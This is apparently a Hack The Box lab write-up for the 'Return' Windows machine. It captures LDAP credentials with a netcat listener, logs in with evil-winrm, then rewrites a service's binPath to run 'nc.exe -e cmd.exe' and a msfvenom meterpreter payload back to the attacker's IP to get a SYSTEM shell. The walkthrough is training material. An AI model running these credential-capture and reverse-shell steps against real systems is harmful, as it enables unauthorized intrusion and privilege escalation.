---
title: "Return from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Return from HTB
`nmap` gave this
```bash
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-22 20:42:37Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49671/tcp open     msrpc         Microsoft Windows RPC
49674/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open     msrpc         Microsoft Windows RPC
49679/tcp open     msrpc         Microsoft Windows RPC
49682/tcp open     msrpc         Microsoft Windows RPC
49694/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-08-22T20:43:39
|_  start_date: N/A
|_clock-skew: 18m34s
```
Get connection on `nc`from the site in `server-address`type your `IP`
```bash
nc -nlvp 389
```
Then click `update`on site
```bash
nc -nvlp 389
listening on [any] 389 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.108] 58347
0*`%return\svc-printer�
                       1edFg43012!!
```
Then use this to connect to `windows`with `evil-winrm`
```bash
evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents>
```
***
User Flag is: 69dd24b5890991f02400238c074f6268
***
``` bash
net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 1:15:13 AM
Password expires             Never
Password changeable          5/27/2021 1:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/22/2024 1:55:54 PM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
```
Members of `server operators` group can start/stop system services. Let's modify a service binary path to obtain a reverse shell
First upload `nc.exe`on machine
```bash
upload /usr/share/windows-resources/binaries/nc.exe

Info: Uploading /usr/share/windows-resources/binaries/nc.exe to C:\Users\svc-printer\Documents\nc.exe
```
Then configure `reverse shell`
```bash
sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.16.7 1234"
```
then
```
sc.exe stop vss
sc.exe start vss
```
This will give us connection no `netcat`
The above-obtained shell is unstable and might die after a few seconds. A more efficient way would be to obtain a `meterpreter`shell and then quickly migrate to a more stable process.
```bash
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.7 LPORT=1337 -f exe > shell.exe
```
Then in `evil-winrm`upload `shell.exe`
```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload shell.exe

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath="C:\Users\svc-printer\Document\shell.exe"

sc.exe stop vss
```
Now run `msfconsoe`
```bash
msf6 > use exploit/multi/handler

msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 10.10.16.7
LHOST => 10.10.16.7

msf6 exploit(multi/handler) > set LPORT 1337
LPORT => 1337

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.16.7:1337
```
Now on `evil-winrm`
```
sc.exe start vss
```
This will give us connection on `meterpreter`and then we should migrate to `svchost.exe`process
```bash
meterpreter > ps
-------
-------------------
 5028  636   svchost.exe    x64   0        NT AUTHORITY\SYSTEM    C:\Windows\System32\sv
                                                                  chost.exe

meterpreter > migrate 5028
[*] Migrating from 4392 to 5028...
[*] Migration completed successfully.
```
Then spawn shell
```bash
meterpreter > shell
Process 2616 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
`root.txt`is located at  `C:\Users\Administrator\Desktop>`
***
Root Flag is: b534ec870c17d48af6a0e7e46c1b6b74
***
![](/assets/images/2024-08-23_01-21-30.png)
